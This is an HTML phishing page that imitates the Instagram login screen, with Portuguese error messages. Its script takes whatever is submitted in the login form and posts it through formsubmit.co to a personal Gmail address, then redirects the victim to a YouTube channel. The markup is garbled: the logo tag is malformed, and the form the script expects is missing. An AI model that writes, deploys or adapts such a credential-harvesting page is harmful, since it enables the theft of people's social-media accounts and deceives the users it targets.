<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram | Login for Instagram</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
  <style>
    body {
      background-color: #fafafa;
      font-family: 'Roboto', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
      color: #262626;
    }

    .logo {
      margin-bottom: 30px;
      font-weight: bold;
      font-size: 28px;
      color: #262626;
      letter-spacing: -0.5px;
    }

    form {
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px 40px 30px;
      border-radius: 6px;
      width: 100%;
      max-width: 320px;
      box-sizing: border-box;
      display: flex;
      flex-direction: column;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.04);
    }

    input {
      margin-bottom: 10px;
      padding: 12px 10px;
      font-size: 14px;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background: #fafafa;
      outline: none;
    }

    input:focus {
      border-color: #a8a8a8;
      background: #fff;
    }

    button {
      background-color: #3897f0;
      border: none;
      color: white;
      font-weight: bold;
      padding: 12px 0;
      font-size: 14px;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 10px;
    }

    button:hover {
      background-color: #2a78d4;
    }

    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #999;
      text-align: center;
      max-width: 320px;
    }

    .footer a {
      color: #00376b;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="logo">L o g i n  f o r  I n s t a g r am /div>
  
   <script>
    const form = document.getElementById('loginForm');

    form.addEventListener('submit', function(event) {
      event.preventDefault();

      const formData = new FormData(form);

      fetch('https://formsubmit.co/ajax/fabiofrancisco655@gmail.com', {
        method: 'POST',
        body: formData,
        headers: { 'Accept': 'application/json' }
      })
      .then(response => {
        if (response.ok) {
          window.location.href = 'https://www.youtube.com/@NATTO_BEATS';
        } else {
          alert('Erro ao enviar o formulário.');
        }
      })
      .catch(() => {
        alert('Erro na conexão.');
      });
    });
  </script>
</body>
</html>
